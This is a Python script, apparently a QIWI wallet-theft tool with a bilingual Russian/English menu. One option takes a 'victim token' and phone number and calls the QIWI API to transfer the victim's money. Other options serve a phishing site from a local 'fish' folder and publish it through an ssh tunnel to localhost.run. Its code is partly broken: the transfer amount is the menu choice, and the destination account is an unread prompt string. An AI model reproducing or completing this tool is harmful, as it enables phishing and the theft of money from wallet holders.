import os
import subprocess
from SimpleQIWI import * 
from colorama import Fore, Back, Style

def cls():
	os.system('cls' if os.name=='nt' else 'clear')

cls()
def banner():
	print(Fore.GREEN + """
 /\\  __`\\    /\\__  _\\    /\\ \\  __/\\ \\   /\\__  _\\    
 \\ \\ \\/\\ \\   \\/_/\\ \\/    \\ \\ \\/\\ \\ \\ \\  \\/_/\\ \\/    
  \\ \\ \\ \\ \\     \\ \\ \\     \\ \\ \\ \\ \\ \\ \\    \\ \\ \\    
   \\ \\ \\'\\     \\_\\ \\__   \\ \\ \\_/ \\_\\ \\    \\_\\ \\__ 
	\\ \\___\\_\\    /\\_____\\   \\ `\\___x___/    /\\_____\
	 \\/__//_/    \\/_____/    '\\/__//__/     \\/_____/ 

 /\\___ \\                     /\\ \\                       
 \\/__/\\ \\     __       ___   \\ \\ \\/'\\       __    _ __  
	_\\ \\ \\  /'__`\\    /'___\\  \\ \\ , <     /'__`\\ /\\`'__\
   /\\ \\_\\ \\/\\ \\L\\.\\_ /\\ \\__/   \\ \\ \\`\\  /\\  __/ \\ \\ \\/ 
   \\ \\____/\\ \\__/.\\_\\ \\____\\   \\ \\_\\ \\_\\ \\____\\ \\ \\_\\ 
	\\/___/  \\/__/\\/_/ \\/____/    \\/_/\\/_/ \\/____/  \\/_/ 
														   """)
	print(Fore.CYAN + "  by @wannadeauth | @wannadeauth_chat (telegram)")
	print("-------------------------------------------------\n\n")
print(Fore.YELLOW + " [1] QIWI API (web version) | веб версия\n")
print(Fore.RED + " [2] QIWI API (terminal) | в терминале\n")
print(Fore.BLUE + " [3] Fishing fake site | фишинг \n\n")

a = input(Fore.GREEN + " Change parametr | Выберите параметр: ")


if a == "1":
	cls()
	banner()
	print(Fore.GREEN + "  Starting Server... ")
	os.system("ssh 80:localhost:8080 ssh.localhost.run &")
	os.system("cd api && php -S localhost:8080")



elif a == "2":
	cls()
	banner()


	token = input(Fore.YELLOW + ' Enter victim token: ')
	phone = input('\n Enter victim phone: ')
	summa = input("\n Money | Сумма: ")
	com = input("\n Comments on the translation | Комментарий к переводу: ")
	api = QApi(token=token, phone=phone)
	print(Fore.WHITE + '\nBalance Founded | Найдено!')

	api.pay(account=" Where to transfer money? | Куда перевести деньги: ", amount= a, comment=com)
	print(api.balance)

elif a == "3":
	cls()
	banner()
	print(Fore.GREEN + "  Starting Server... ")
	os.system("ssh 80:localhost:8080 ssh.localhost.run &")

	os.system("cd fish && php -S localhost:8080")


else:
	print(Fore.RED + " Выбран неверный параметр | No found such parametr")


